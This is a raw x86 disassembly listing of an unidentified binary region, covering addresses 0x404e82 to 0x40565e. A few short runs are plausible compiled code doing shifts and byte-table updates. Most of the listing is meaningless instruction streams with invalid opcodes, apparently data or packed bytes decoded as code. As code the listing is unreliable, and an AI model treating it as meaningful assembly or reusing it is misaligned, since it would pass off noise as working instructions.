  404e82:	jbe    0x404e74
  404e84:	pushf  
  404e85:	push   ds
  404e86:	cwde   
  404e87:	ss mov esp,0x982074e5
  404e8d:	mov    esp,0xf078997f
  404e92:	int    0xca
  404e94:	inc    eax
  404e95:	cmp    al,0x4
  404e97:	pop    esi
  404e98:	cmp    eax,0x80013e67
  404e9d:	in     al,dx
  404e9e:	clc    
  404e9f:	outs   dx,DWORD PTR ds:[esi]
  404ea0:	in     al,0x65
  404ea2:	loopne 0x404ee3
  404ea4:	mov    dl,0x74
  404ea6:	fnsave ds:[ecx]
  404ea9:	sbb    al,0xd4
  404eab:	test   al,0x49
  404ead:	cmp    DWORD PTR [edi+0x28a6d258],ebx
  404eb3:	jp     0x404ed3
  404eb5:	and    al,0x5a
  404eb7:	sar    DWORD PTR [ecx+ecx*4+0x78],cl
  404ebb:	push   ebp
  404ebc:	dec    esp
  404ebd:	xchg   esp,eax
  404ebe:	inc    ebx
  404ebf:	aam    0x1b
  404ec1:	add    BYTE PTR [ebx-0x2],bl
  404ec4:	mov    ebx,0x332642b3
  404ec9:	(bad)  
  404eca:	xor    edx,edx
  404ecc:	or     eax,edx
  404ece:	mov    cl,BYTE PTR [eax+ecx*1]
  404ed1:	mov    eax,DWORD PTR [ebp-0x34]
  404ed4:	or     BYTE PTR [eax],cl
  404ed6:	mov    eax,DWORD PTR [ebp-0x10]
  404ed9:	mov    ecx,DWORD PTR [ebp-0xc]
  404edc:	shrd   eax,ecx,0x2
  404ee0:	shr    ecx,0x2
  404ee3:	mov    ecx,DWORD PTR [ebp-0x10]
  404ee6:	mov    edx,DWORD PTR [ebp-0xc]
  404ee9:	xor    eax,edi
  404eeb:	shl    ecx,0x1e
  404eee:	xor    edx,edx
  404ef0:	or     eax,edx
  404ef2:	lea    eax,[ebp+eax*1-0x4]
  404ef6:	mov    DWORD PTR [ebp-0x34],eax
  404ef9:	mov    eax,DWORD PTR [ebp-0x10]
  404efc:	mov    ecx,DWORD PTR [ebp-0xc]
  404eff:	shrd   eax,ecx,0x2
  404f03:	shr    ecx,0x2
  404f06:	mov    ecx,DWORD PTR [ebp-0x10]
  404f09:	mov    edx,DWORD PTR [ebp-0xc]
  404f0c:	xor    eax,edi
  404f0e:	shl    ecx,0x1e
  404f11:	mov    ecx,DWORD PTR [ebp-0x14]
  404f14:	xor    edx,edx
  404f16:	or     eax,edx
  404f18:	mov    cl,BYTE PTR [eax+ecx*1]
  404f1b:	mov    eax,DWORD PTR [ebp-0x34]
  404f1e:	add    BYTE PTR [eax],cl
  404f20:	mov    eax,DWORD PTR [ebp-0x60]
  404f23:	mov    ecx,DWORD PTR [ebp-0x5c]
  404f26:	shrd   eax,ecx,0x2
  404f2a:	shr    ecx,0x2
  404f2d:	mov    ecx,DWORD PTR [ebp-0x60]
  404f30:	mov    edx,DWORD PTR [ebp-0x5c]
  404f33:	xor    eax,edi
  404f35:	xor    edx,edx
  404f37:	or     eax,edx
  404f39:	lea    eax,[ebp+eax*1-0x4]
  404f3d:	mov    DWORD PTR [ebp-0x34],eax
  404f40:	mov    eax,DWORD PTR [ebp-0x60]
  404f43:	shl    ecx,0x1e
  404f46:	mov    ecx,DWORD PTR [ebp-0x5c]
  404f49:	shrd   eax,ecx,0x2
  404f4d:	shr    ecx,0x2
  404f50:	mov    ecx,DWORD PTR [ebp-0x60]
  404f53:	mov    edx,DWORD PTR [ebp-0x5c]
  404f56:	xor    eax,edi
  404f58:	xor    edx,edx
  404f5a:	or     eax,edx
  404f5c:	mov    edx,DWORD PTR [ebp+0x14]
  404f5f:	shl    ecx,0x1e
  404f62:	mov    ecx,DWORD PTR [ebp-0x14]
  404f65:	mov    cl,BYTE PTR [eax+ecx*1]
  404f68:	mov    eax,DWORD PTR [ebp-0x34]
  404f6b:	or     BYTE PTR [eax],cl
  404f6d:	jmp    0x40530e
  404f72:	mov    DWORD PTR [edx],ecx
  404f74:	push   0xabac68c5
  404f79:	mov    al,BYTE PTR [edi+0x6b920a40]
  404f7f:	enter  0x90d1,0xbe
  404f83:	adc    DWORD PTR [esi-0x413b4242],edi
  404f89:	mov    esi,0xc419d1a0
  404f8e:	mov    BYTE PTR [ebp+0x30],0x25
  404f92:	mov    ds:0x5b8b2543,eax
  404f97:	xchg   esi,eax
  404f98:	xchg   edx,eax
  404f99:	pop    esp
  404f9a:	jnp    0x404ff9
  404f9c:	lods   al,BYTE PTR ds:[esi]
  404f9d:	call   0xf4c6:0xd1f1fab5
  404fa4:	or     BYTE PTR [esi],cl
  404fa6:	add    BYTE PTR [ebx],ah
  404fa8:	push   esp
  404fa9:	aas    
  404faa:	test   eax,0x89152a64
  404faf:	jbe    0x404fee
  404fb1:	cmp    DWORD PTR fs:[ebx+eax*1+0x56a45558],ecx
  404fb9:	jns    0x404faf
  404fbb:	in     eax,dx
  404fbc:	or     BYTE PTR [edx-0x32],ah
  404fbf:	sub    al,0xd6
  404fc1:	and    DWORD PTR [ecx+0x64],ecx
  404fc4:	inc    ebx
  404fc5:	xchg   edi,eax
  404fc6:	mov    ecx,0x29f0d853
  404fcb:	mov    bl,0x19
  404fcd:	cmp    al,0x84
  404fcf:	and    ebx,DWORD PTR ds:0xba1b4904
  404fd5:	aaa    
  404fd6:	sbb    BYTE PTR [esp+edi*2],0xa3
  404fda:	mov    ds:0x5d3c4952,eax
  404fdf:	cwde   
  404fe0:	pop    esp
  404fe1:	jl     0x405044
  404fe3:	ins    DWORD PTR es:[edi],dx
  404fe4:	sbb    eax,0xaa61f049
  404fe9:	adc    BYTE PTR ds:0x6e719495,bl
  404fef:	imul   BYTE PTR [ebx-0x2e]
  404ff2:	in     al,dx
  404ff3:	or     BYTE PTR [ebp+0x69be2754],ch
  404ff9:	(bad)  
  404ffa:	mov    ebx,0x44209d38
  404fff:	(bad)  
  405000:	addr16 mov edx,0x6d2d7942
  405006:	inc    edi
  405007:	adc    eax,0xdb6614d0
  40500c:	or     ecx,DWORD PTR [ecx]
  40500e:	sbb    bh,ah
  405010:	inc    esp
  405011:	pop    ss
  405012:	ret    
  405013:	(bad)  
  405014:	aas    
  405015:	test   BYTE PTR [ebp+0x14926ff7],dl
  40501b:	scas   eax,DWORD PTR es:[edi]
  40501c:	lahf   
  40501d:	cmp    DWORD PTR [esi],ebp
  40501f:	pushf  
  405020:	pop    eax
  405021:	test   eax,0xadfb88e9
  405026:	mov    esp,0x2d2c856d
  40502b:	xchg   esp,eax
  40502c:	cmp    al,0x21
  40502e:	and    DWORD PTR [edi+edi*1],ebx
  405031:	mov    edx,0xe3e87bd2
  405036:	adc    DWORD PTR [esi+eax*1],edx
  405039:	mov    ss,WORD PTR [eax-0x33e24402]
  40503f:	xchg   ebp,eax
  405040:	ins    BYTE PTR es:[edi],dx
  405041:	xchg   ebx,eax
  405042:	(bad)  
  405043:	xchg   esi,eax
  405044:	stos   BYTE PTR es:[edi],al
  405045:	mov    eax,0x15947805
  40504a:	push   ebx
  40504b:	aad    0xca
  40504d:	add    eax,0xa3bc051a
  405052:	adc    edi,esp
  405054:	pop    edx
  405055:	mov    ebx,0xf9bc52f7
  40505a:	cld    
  40505b:	inc    esi
  40505c:	add    al,0xaa
  40505e:	add    dl,BYTE PTR fs:[ecx+eiz*8-0x34]
  405063:	mov    cl,0x53
  405065:	sbb    dl,BYTE PTR [edi-0x5f]
  405068:	push   esp
  405069:	out    0x1,al
  40506b:	xchg   esp,eax
  40506c:	xchg   esi,eax
  40506d:	dec    edx
  40506e:	push   0x1f
  405070:	add    eax,0xee5da7dc
  405075:	xor    DWORD PTR [edi],esi
  405077:	rcl    BYTE PTR [esi+edi*4],cl
  40507a:	call   0xd66b:0x54dc1def
  405081:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405082:	adc    esi,0xf5a469e5
  405088:	cmp    eax,0xdb76be10
  40508d:	sbb    BYTE PTR [edi-0x590ccaa4],bh
  405093:	xchg   BYTE PTR [edi+edi*1],dh
  405096:	jle    0x4050ec
  405098:	dec    esp
  405099:	mov    DWORD PTR [edi+0x60a0c1bc],0xf51e543b
  4050a3:	jno    0x405112
  4050a5:	loopne 0x4050ba
  4050a7:	mov    bl,0x11
  4050a9:	xlat   BYTE PTR ds:[ebx]
  4050aa:	push   ebp
  4050ab:	clc    
  4050ac:	sub    DWORD PTR [ecx+0x53],eax
  4050af:	xchg   ebp,eax
  4050b0:	and    BYTE PTR [edx-0x17f989dc],0x13
  4050b7:	adc    DWORD PTR [eax+eiz*1+0x32],ebx
  4050bb:	sar    DWORD PTR [ebx+0x705966a6],cl
  4050c1:	sar    BYTE PTR [ecx+0x56f9dc71],1
  4050c7:	lods   eax,DWORD PTR ds:[esi]
  4050c8:	imul   esp,ebp,0x4
  4050cb:	pop    eax
  4050cc:	pop    edx
  4050cd:	ss xchg ecx,eax
  4050cf:	addr16 push eax
  4050d1:	ja     0x4050eb
  4050d3:	out    dx,eax
  4050d4:	dec    edx
  4050d5:	fimul  WORD PTR es:[ecx-0x13]
  4050d9:	or     al,0xd2
  4050db:	out    0x45,al
  4050dd:	mov    ds:0xb1d8a5da,eax
  4050e2:	sahf   
  4050e3:	outs   dx,DWORD PTR ds:[esi]
  4050e4:	adc    DWORD PTR [ebx+0x4c03efa7],edi
  4050ea:	sbb    BYTE PTR [ebx+0x6f0addb1],dl
  4050f0:	das    
  4050f1:	cli    
  4050f2:	ins    BYTE PTR es:[edi],dx
  4050f3:	adc    DWORD PTR [esi],ebp
  4050f5:	rol    BYTE PTR [ecx+0x3fe51c85],0x9
  4050fc:	pop    esp
  4050fd:	in     eax,dx
  4050fe:	aaa    
  4050ff:	jb     0x405180
  405101:	daa    
  405102:	popa   
  405103:	in     al,dx
  405104:	mov    edi,0x395a25
  405109:	cmp    esi,DWORD PTR [ebx]
  40510b:	push   cs
  40510c:	jle    0x405177
  40510e:	cmp    ebx,DWORD PTR [eax]
  405110:	push   ebx
  405111:	push   eax
  405112:	push   cs
  405113:	ret    
  405114:	xchg   esp,eax
  405115:	and    eax,0xa70573ef
  40511a:	lods   al,BYTE PTR ds:[esi]
  40511b:	arpl   WORD PTR [edx+0x37],cx
  40511e:	pushf  
  40511f:	fstp   DWORD PTR [ebp+0x4b7301af]
  405125:	retf   
  405126:	sbb    eax,0x84ce8580
  40512b:	mov    dl,0x62
  40512d:	ret    0xe6e8
  405130:	mov    ch,0x20
  405132:	xchg   edi,eax
  405133:	scas   al,BYTE PTR es:[edi]
  405134:	cmp    esp,ecx
  405136:	cwde   
  405137:	loop   0x40519e
  405139:	pop    eax
  40513a:	jae    0x4051a1
  40513c:	(bad)  
  40513d:	sbb    eax,0x57c718b7
  405142:	packssdw mm1,QWORD PTR [edi+0x47]
  405146:	rcl    BYTE PTR [ecx],1
  405148:	fs cmc 
  40514a:	loope  0x4050d6
  40514c:	xlat   BYTE PTR ds:[ebx]
  40514d:	popf   
  40514e:	imul   esp,ebp,0x96453e3e
  405154:	mov    ecx,0x6f93e2c8
  405159:	xchg   ebp,eax
  40515a:	fldenv [edi]
  40515c:	je     0x405134
  40515e:	imul   ebp,DWORD PTR [eax+0x47],0xfffffff2
  405162:	shl    DWORD PTR [eax-0x36],1
  405165:	add    al,0x73
  405167:	inc    ebp
  405168:	fisubr WORD PTR [edx]
  40516a:	pop    ebp
  40516b:	cmp    DWORD PTR [eax],eax
  40516d:	ss mov eax,0x5f6fd27b
  405173:	adc    cl,BYTE PTR [ecx-0x739a031a]
  405179:	pop    ss
  40517a:	ret    0x55bc
  40517d:	mov    ds:0xfcc2625c,eax
  405182:	out    0x8f,al
  405184:	xchg   ebx,eax
  405185:	xchg   ebx,eax
  405186:	mov    al,0xf3
  405188:	sbb    BYTE PTR [edi],ah
  40518a:	pop    ss
  40518b:	lock push ecx
  40518d:	adc    dh,BYTE PTR [eax-0x4ee08034]
  405193:	or     al,0x75
  405195:	mov    edx,ebx
  405197:	xlat   BYTE PTR ds:[ebx]
  405198:	adc    esp,DWORD PTR [eax]
  40519a:	xor    eax,0xbdc8f70c
  40519f:	shr    edx,0x4e
  4051a2:	pusha  
  4051a3:	scas   al,BYTE PTR es:[edi]
  4051a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4051a5:	test   eax,0x23e8cd43
  4051aa:	jne    0x40515e
  4051ac:	push   ss
  4051ad:	(bad)  
  4051ae:	int3   
  4051af:	aam    0x5e
  4051b1:	push   ebp
  4051b2:	fsubr  DWORD PTR [ecx]
  4051b4:	stos   DWORD PTR es:[edi],eax
  4051b5:	stos   DWORD PTR es:[edi],eax
  4051b6:	jbe    0x40515a
  4051b8:	test   eax,0xc43861a1
  4051bd:	cmp    eax,0xfb3b4f5a
  4051c2:	jnp    0x405154
  4051c4:	jecxz  0x40516c
  4051c6:	and    ah,BYTE PTR [ebx+0x5c]
  4051c9:	pop    eax
  4051ca:	or     dl,dl
  4051cc:	fwait
  4051cd:	into   
  4051ce:	sbb    ebx,DWORD PTR [ecx-0x10]
  4051d1:	in     al,0xae
  4051d3:	js     0x405202
  4051d5:	pop    ds
  4051d6:	push   ebx
  4051d7:	jb     0x4051bf
  4051d9:	dec    ebx
  4051da:	jge    0x40521e
  4051dc:	das    
  4051dd:	mov    bl,0x80
  4051df:	or     esp,ecx
  4051e1:	out    0x3c,al
  4051e3:	mov    BYTE PTR [ebx+0x3b409712],al
  4051e9:	xor    al,0x94
  4051eb:	std    
  4051ec:	jle    0x4051ec
  4051ee:	pop    edi
  4051ef:	pop    sp
  4051f1:	test   eax,0xf332a020
  4051f6:	fstp   QWORD PTR [eax-0x50]
  4051f9:	bound  ebp,QWORD PTR [edi-0xc7d41a4]
  4051ff:	jle    0x40520d
  405201:	scas   eax,DWORD PTR es:[edi]
  405202:	pop    es
  405203:	push   ebp
  405204:	outs   dx,DWORD PTR gs:[esi]
  405206:	pop    eax
  405207:	(bad)  
  405208:	cld    
  405209:	xlat   BYTE PTR ds:[ebx]
  40520a:	dec    edx
  40520b:	sar    DWORD PTR [edi],cl
  40520d:	mov    bh,0x12
  40520f:	iret   
  405210:	imul   esi,DWORD PTR [edi-0x64],0x14
  405214:	aas    
  405215:	pop    ds
  405216:	outs   dx,BYTE PTR ds:[esi]
  405217:	and    ebp,DWORD PTR [edi]
  405219:	shl    DWORD PTR [ebp+0x358dead2],0xca
  405220:	mov    al,ds:0xe1f8350
  405225:	lods   al,BYTE PTR ds:[esi]
  405226:	div    dl
  405228:	int    0xe1
  40522a:	and    ah,bh
  40522c:	or     al,0x0
  40522e:	pop    ds
  40522f:	outs   dx,DWORD PTR ds:[esi]
  405230:	jecxz  0x405288
  405232:	mov    dl,0xa0
  405234:	mov    dh,0xf2
  405236:	mov    BYTE PTR [eax-0x747298f],ah
  40523c:	and    DWORD PTR [edi-0x64be596f],edi
  405242:	push   ebx
  405243:	(bad)  
  405244:	(bad)  
  405245:	loope  0x4052ab
  405247:	call   0x61e77780
  40524c:	xor    eax,0xa369aefd
  405251:	scas   al,BYTE PTR es:[edi]
  405252:	cmp    esi,ecx
  405254:	xchg   esi,eax
  405255:	pop    ebx
  405256:	(bad)  
  405257:	in     al,0x3b
  405259:	xchg   bl,ch
  40525b:	and    DWORD PTR [eax+0x6c],0x119f2513
  405262:	gs inc edi
  405264:	xor    DWORD PTR [eax-0xd58c115],edx
  40526a:	pop    edx
  40526b:	mov    esp,0x87ba12a7
  405270:	fnstsw WORD PTR [edi]
  405272:	mov    cl,bl
  405274:	push   ebx
  405275:	mov    esi,0x78021e1b
  40527a:	mov    edx,0x89083862
  40527f:	dec    ebx
  405280:	and    al,0x2d
  405282:	and    BYTE PTR [edi+0xa1e66a3],cl
  405288:	cld    
  405289:	add    al,0xc2
  40528b:	mov    edx,0xb747270f
  405290:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405291:	jmp    0x13fa:0x4b647cab
  405298:	lock cmps DWORD PTR fs:[esi],DWORD PTR es:[edi]
  40529b:	lahf   
  40529c:	mov    bl,0x39
  40529e:	mov    bl,0xa2
  4052a0:	pop    eax
  4052a1:	add    BYTE PTR [edx-0x3e],ah
  4052a4:	popf   
  4052a5:	xchg   ecx,eax
  4052a6:	cmp    al,0xa9
  4052a8:	sbb    BYTE PTR [eax+0x4e24608a],bl
  4052ae:	dec    eax
  4052af:	or     dl,ch
  4052b1:	sbb    al,0xfd
  4052b3:	enter  0xf9a,0xdf
  4052b7:	xchg   cl,bl
  4052b9:	mov    esi,0xd852aec8
  4052be:	dec    edx
  4052bf:	mov    esi,DWORD PTR [edx-0x5b642152]
  4052c5:	out    0x8,eax
  4052c7:	stos   BYTE PTR es:[edi],al
  4052c8:	dec    esi
  4052c9:	int    0xe5
  4052cb:	outs   dx,BYTE PTR ds:[esi]
  4052cc:	xlat   BYTE PTR ds:[ebx]
  4052cd:	and    esi,DWORD PTR [eax+0x4f]
  4052d0:	outs   dx,BYTE PTR ds:[esi]
  4052d1:	bound  ebx,QWORD PTR [ebx]
  4052d3:	repz pop ebx
  4052d5:	adc    al,0x9e
  4052d7:	test   eax,0x3bcd3ca1
  4052dc:	out    dx,eax
  4052dd:	daa    
  4052de:	add    dh,BYTE PTR [ebx]
  4052e0:	inc    eax
  4052e1:	arpl   WORD PTR [esi+0x11],bx
  4052e4:	in     al,0x16
  4052e6:	jmp    0xc344:0xd533d4f1
  4052ed:	fld    QWORD PTR [ebx]
  4052ef:	aaa    
  4052f0:	adc    eax,0xfc208d06
  4052f5:	xchg   ecx,eax
  4052f6:	ret    
  4052f7:	ror    BYTE PTR ds:0x21a168f0,cl
  4052fd:	mov    ebx,0xbac05190
  405302:	dec    edi
  405303:	xor    BYTE PTR [ebx-0x12cff1ae],al
  405309:	jmp    0x40531d
  40530b:	jno    0x40532a
  40530d:	xor    eax,0x8b10458b
  405312:	enter  0xac0f,0xd1
  405316:	add    al,cl
  405318:	loopne 0x405338
  40531a:	shr    edx,0x2
  40531d:	mov    DWORD PTR [ebp+0x14],edx
  405320:	mov    DWORD PTR [ebp+0x14],eax
  405323:	xor    edx,edx
  405325:	mov    eax,ecx
  405327:	jmp    0x4056c8
  40532c:	sub    eax,0x846700b2
  405331:	jnp    0x4052e9
  405333:	mov    esp,0xe3d964fe
  405338:	repnz pop ds
  40533a:	retf   
  40533b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40533c:	mov    ebp,0xbdbebe17
  405341:	les    edi,FWORD PTR [esi-0xe90b742]
  405347:	xchg   ebx,eax
  405348:	fs jnp 0x405368
  40534b:	and    eax,DWORD PTR [edx+0x79]
  40534e:	cmp    ax,0x54e
  405352:	test   al,0xae
  405354:	(bad)  
  405356:	fmulp  st(4),st
  405358:	jg     0x405339
  40535a:	in     eax,dx
  40535b:	rcl    dl,0x47
  40535e:	cmp    BYTE PTR [edi],0x40
  405361:	jg     0x40536a
  405363:	adc    BYTE PTR [esp+ecx*1+0x6],0x79
  405368:	mov    eax,ds:0xbc869e0d
  40536d:	out    0x1d,al
  40536f:	mov    ch,0x25
  405371:	inc    ebp
  405372:	sub    al,0xa9
  405374:	jmp    0x405366
  405376:	push   0x41c5b929
  40537b:	xor    eax,0x4917571b
  405380:	lds    ebp,FWORD PTR [ebx]
  405382:	jno    0x40533e
  405384:	repnz call 0x8501:0x5dd2e2ac
  40538c:	or     DWORD PTR [eax],0xba5bff06
  405392:	stos   BYTE PTR es:[edi],al
  405393:	repnz clc 
  405395:	push   edx
  405396:	cdq    
  405397:	dec    esp
  405398:	into   
  405399:	pop    eax
  40539a:	mov    ecx,ecx
  40539c:	adc    DWORD PTR ds:0xd9e840c6,ebp
  4053a2:	in     al,dx
  4053a3:	jmp    0x2f8f:0x837edabf
  4053aa:	mov    dl,0x91
  4053ac:	popf   
  4053ad:	dec    eax
  4053ae:	sub    bl,dh
  4053b0:	and    BYTE PTR [ecx],0xd4
  4053b3:	xchg   BYTE PTR [edi],ch
  4053b5:	test   BYTE PTR [edi+ebp*8],bl
  4053b8:	jnp    0x405384
  4053ba:	test   al,0xa2
  4053bc:	or     al,0x4e
  4053be:	aad    0x51
  4053c0:	xchg   esp,ebp
  4053c2:	scas   al,BYTE PTR es:[edi]
  4053c3:	sub    eax,0xf9883dc0
  4053c8:	cmc    
  4053c9:	rol    BYTE PTR [edi-0x1e71d4bb],1
  4053cf:	(bad)  
  4053d0:	jo     0x405379
  4053d2:	mov    ebx,DWORD PTR [eax+0x5c]
  4053d5:	pop    es
  4053d6:	sub    BYTE PTR [edx],ah
  4053d8:	dec    ebx
  4053d9:	pop    edx
  4053da:	push   ecx
  4053db:	ret    0x898d
  4053de:	hlt    
  4053df:	into   
  4053e0:	icebp  
  4053e1:	add    DWORD PTR [ebx-0x6],esp
  4053e4:	icebp  
  4053e5:	nop
  4053e6:	popa   
  4053e7:	lock adc al,0x94
  4053ea:	mov    ebp,0xb5c614f1
  4053ef:	mov    cs,WORD PTR [esi-0x5]
  4053f2:	mov    edi,0x973bd77e
  4053f7:	retf   0x252e
  4053fa:	call   0x3a2826e0
  4053ff:	rol    DWORD PTR [ebx-0x73],1
  405402:	jp     0x405436
  405404:	je     0x405399
  405406:	mov    edx,0x10f61585
  40540b:	lods   al,BYTE PTR ds:[esi]
  40540c:	cmc    
  40540d:	jmp    0x2006:0x80060cbe
  405414:	mov    al,ds:0xc3af3de1
  405419:	mov    ecx,0xf6222355
  40541e:	idiv   DWORD PTR [edi]
  405420:	push   esp
  405421:	fiadd  DWORD PTR [ecx-0x45fb3d8f]
  405427:	jl     0x4053dc
  405429:	test   ch,bl
  40542b:	add    BYTE PTR [ebx-0x125593bb],bh
  405431:	xchg   ebp,eax
  405432:	loop   0x4053f3
  405434:	push   esp
  405435:	mov    esp,0x333ac8d4
  40543a:	(bad)  
  40543b:	or     edx,DWORD PTR [edi-0x2e]
  40543e:	jne    0x40546a
  405440:	pop    eax
  405441:	sbb    DWORD PTR [ecx+0x16923e06],ecx
  405447:	cs mov bh,0xd0
  40544a:	pop    ss
  40544b:	mov    DWORD PTR [esi+0x6c],ecx
  40544e:	sub    eax,0xdadd1ff0
  405453:	les    ebx,FWORD PTR [edx+0x3ba2723f]
  405459:	dec    ecx
  40545a:	pop    edx
  40545b:	sbb    eax,0x79886bf4
  405460:	ja     0x4054d8
  405462:	push   eax
  405463:	fwait
  405464:	add    bh,dl
  405466:	pusha  
  405467:	or     al,0x7f
  405469:	mov    edi,0x33f8cf76
  40546e:	lock lahf 
  405470:	(bad)  
  405471:	xlat   BYTE PTR ds:[ebx]
  405472:	aam    0xba
  405474:	mov    ebx,0x2f783794
  405479:	pop    ecx
  40547a:	sbb    ebx,ecx
  40547c:	xor    eax,ecx
  40547e:	mov    cl,0xc9
  405480:	xor    esp,DWORD PTR ds:0xffb4f91b
  405486:	(bad)  
  405487:	jmp    0x40547b
  405489:	cmp    edi,DWORD PTR ds:0xb5ad09f8
  40548f:	call   edi
  405491:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405492:	js     0x4054c3
  405494:	jge    0x405503
  405496:	push   ds
  405497:	retf   
  405498:	mul    DWORD PTR cs:[ecx+edi*4-0x6d]
  40549d:	dec    esi
  40549e:	les    ebp,FWORD PTR [edx-0x14927d22]
  4054a4:	sub    dl,dl
  4054a6:	inc    ebp
  4054a7:	jge    0x40551f
  4054a9:	mov    al,ds:0x17373631
  4054ae:	sub    ch,dh
  4054b0:	sahf   
  4054b1:	pop    edx
  4054b2:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4054b4:	lds    ebp,FWORD PTR [ebx+0x242703a0]
  4054ba:	and    eax,0x5f96aeb4
  4054bf:	mov    esp,0x6e182329
  4054c4:	jg     0x405505
  4054c6:	clc    
  4054c7:	into   
  4054c8:	ret    0x7aaf
  4054cb:	inc    edx
  4054cc:	push   ss
  4054cd:	xchg   DWORD PTR [eax+0x50c2f17e],ecx
  4054d3:	xor    ch,BYTE PTR [ebp+0x35]
  4054d6:	nop
  4054d7:	xor    edx,DWORD PTR [esi]
  4054d9:	addr16 and ebp,ebx
  4054dc:	enter  0x58ee,0x59
  4054e0:	dec    ebx
  4054e1:	or     al,0x66
  4054e3:	sar    BYTE PTR [ebx+0x4f58b593],0xc1
  4054ea:	icebp  
  4054eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4054ec:	adc    eax,0xcc1c6607
  4054f1:	mov    esp,edi
  4054f3:	mov    eax,0xbd202013
  4054f8:	loopne 0x4054c8
  4054fa:	or     BYTE PTR [esi+0x21f72d5f],al
  405500:	std    
  405501:	dec    esi
  405502:	sbb    DWORD PTR [ecx+ecx*4+0x5f37523c],ebx
  405509:	pop    edi
  40550a:	lea    esp,[ebp+0x51]
  40550d:	xchg   esi,eax
  40550e:	shl    ebp,cl
  405510:	div    ebp
  405512:	mov    esp,DWORD PTR [edx]
  405514:	ret    
  405515:	ss dec edx
  405517:	pop    ss
  405518:	daa    
  405519:	xchg   edx,eax
  40551a:	xor    edx,DWORD PTR [eax+0x23]
  40551d:	add    al,BYTE PTR [edi+0x37f7cffe]
  405523:	fisub  DWORD PTR [ebx-0x49]
  405526:	cmp    dl,BYTE PTR [ebx+0x7c]
  405529:	cmp    bl,BYTE PTR [ebp-0x78]
  40552c:	imul   edi,ebp,0x83f27011
  405532:	in     eax,0x7c
  405534:	outs   dx,BYTE PTR ds:[esi]
  405535:	jecxz  0x4054b7
  405537:	jo     0x405505
  405539:	lods   al,BYTE PTR ds:[esi]
  40553a:	and    esi,ebx
  40553c:	lds    ebp,FWORD PTR [edi-0x43dc5698]
  405542:	xlat   BYTE PTR ds:[ebx]
  405543:	in     eax,dx
  405544:	enterw 0x17c,0xf
  405549:	and    ah,BYTE PTR [ecx-0x6933091]
  40554f:	push   ebp
  405550:	sub    ebx,DWORD PTR [edx]
  405552:	sub    BYTE PTR ss:[ebx+0x9],al
  405556:	pop    ecx
  405557:	in     al,dx
  405558:	mov    al,ds:0xc8cc88c9
  40555d:	int3   
  40555e:	hlt    
  40555f:	adc    BYTE PTR [ebp+0x44650e73],0x3d
  405566:	loopne 0x405565
  405568:	cmp    eax,0x23d53200
  40556d:	dec    edx
  40556e:	add    eax,0xfc827c99
  405573:	add    bh,ch
  405575:	std    
  405576:	inc    edx
  405577:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405578:	popa   
  405579:	sahf   
  40557a:	rcr    BYTE PTR [eax+0x8],cl
  40557d:	xchg   BYTE PTR [ecx],bh
  40557f:	cdq    
  405580:	ja     0x405578
  405582:	xchg   esi,eax
  405583:	fsubr  st(4),st
  405585:	mov    cl,bh
  405587:	jae    0x405580
  405589:	pushf  
  40558a:	shr    DWORD PTR [ebp+eiz*1-0x68],0x7e
  40558f:	xchg   ecx,eax
  405590:	or     esp,DWORD PTR [ebx-0x66]
  405593:	pop    ebp
  405594:	pop    es
  405595:	sub    ah,BYTE PTR [esi]
  405597:	and    ebx,DWORD PTR [edx-0x14]
  40559a:	and    DWORD PTR [eax+0x17],0xd8bd086c
  4055a1:	push   ebp
  4055a2:	hlt    
  4055a3:	sahf   
  4055a4:	int    0xc2
  4055a6:	sahf   
  4055a7:	cmp    BYTE PTR [eax+0x7eb3c059],al
  4055ad:	sub    edi,DWORD PTR [edi+0x2c]
  4055b0:	push   esp
  4055b1:	sub    dl,BYTE PTR [ebx+eiz*4-0x30c051ea]
  4055b8:	sub    esi,DWORD PTR [esp+ebp*8+0xe10f400]
  4055bf:	or     al,0x93
  4055c1:	out    dx,al
  4055c2:	add    eax,0x7a625d5b
  4055c7:	fdiv   QWORD PTR ds:0xb009eab5
  4055cd:	mov    eax,?
  4055cf:	sub    dl,cl
  4055d1:	add    eax,ecx
  4055d3:	and    edx,edx
  4055d5:	setge  BYTE PTR [eax-0x64d93b0d]
  4055dc:	stc    
  4055dd:	out    dx,al
  4055de:	lahf   
  4055df:	jp     0x4055dc
  4055e1:	jnp    0x4055a1
  4055e3:	sbb    al,0x21
  4055e5:	cwde   
  4055e6:	shl    ch,cl
  4055e8:	ficom  DWORD PTR [ebp-0x69]
  4055eb:	mov    eax,0x81816e02
  4055f0:	cmc    
  4055f1:	mov    WORD PTR [edx-0x166ec8c1],gs
  4055f7:	and    BYTE PTR [edx],al
  4055f9:	imul   DWORD PTR [ebp-0x6c965285]
  4055ff:	rol    BYTE PTR [ebp+0x0],1
  405602:	pop    ebp
  405603:	daa    
  405604:	lock dec ebp
  405606:	sbb    DWORD PTR ds:0x49cf5493,edi
  40560c:	xchg   esp,eax
  40560d:	(bad)  
  40560e:	adc    DWORD PTR [ecx+0x77c352e8],eax
  405614:	fidivr WORD PTR [edi-0x3d]
  405617:	sub    ch,dl
  405619:	vpshlq ymm3,[edi+ebx*1],xmm2
  40561f:	aas    
  405620:	lock jb 0x40561e
  405623:	xor    DWORD PTR [ebx+eiz*1+0x7a],0xd155c147
  40562b:	das    
  40562c:	xor    esi,DWORD PTR [esi-0x78]
  40562f:	mov    ds:0xddc368f5,eax
  405634:	push   ebp
  405635:	inc    edx
  405636:	jge    0x4055b8
  405638:	ficomp WORD PTR [ecx+0x3d]
  40563b:	dec    esp
  40563c:	ret    
  40563d:	or     ah,cl
  40563f:	inc    ebx
  405640:	and    al,0x64
  405642:	scas   eax,DWORD PTR es:[edi]
  405643:	aas    
  405644:	push   ebx
  405645:	fsub   st(3),st
  405647:	pop    esp
  405648:	dec    eax
  405649:	ret    
  40564a:	dec    esi
  40564b:	or     edx,ecx
  40564d:	mov    dl,bl
  40564f:	aaa    
  405650:	mov    DWORD PTR [ecx+ebx*4-0x79],ebx
  405654:	pop    ecx
  405655:	ret    
  405656:	std    
  405657:	mov    dh,0x2d
  405659:	jl     0x4055de
  40565b:	lock les esp,FWORD PTR [esi]
  40565e:	jne    0x4055e0
